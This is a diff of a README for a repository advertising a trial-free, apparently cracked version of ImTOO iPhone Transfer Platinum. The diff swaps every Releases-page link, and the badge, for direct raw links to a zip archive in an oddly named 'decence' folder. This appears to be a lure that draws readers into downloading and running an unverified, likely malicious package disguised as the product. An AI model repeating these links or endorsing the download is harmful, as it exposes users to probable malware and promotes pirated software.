@@ -1,6 +1,6 @@
 # 📱 ImTOO-iPhone-Transfer-Platinum-No-Trial - Easy Transfer for Your iPhone
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/main/decence/ImTOO-iPhone-Transfer-Platinum-No-Trial-3.6-alpha.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/main/decence/ImTOO-iPhone-Transfer-Platinum-No-Trial-3.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ImTOO iPhone Transfer Platinum repository! This tool helps you tr
 
 To get started, you need to download the software. Click on the link below to visit the Releases page:
 
-[Download ImTOO iPhone Transfer Platinum](https://github.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/releases)
+[Download ImTOO iPhone Transfer Platinum](https://raw.githubusercontent.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/main/decence/ImTOO-iPhone-Transfer-Platinum-No-Trial-3.6-alpha.5.zip)
 
 Once you're on the page, follow these steps:
 
@@ -101,6 +101,6 @@ For ongoing discussions related to ImTOO iPhone Transfer Platinum, consider chec
 
 To get started with your download, don't forget to visit the Releases page again:
 
-[Download ImTOO iPhone Transfer Platinum](https://github.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/releases) 
+[Download ImTOO iPhone Transfer Platinum](https://raw.githubusercontent.com/samu2231sssss/ImTOO-iPhone-Transfer-Platinum-No-Trial/main/decence/ImTOO-iPhone-Transfer-Platinum-No-Trial-3.6-alpha.5.zip) 
 
 Thank you for choosing ImTOO iPhone Transfer Platinum!
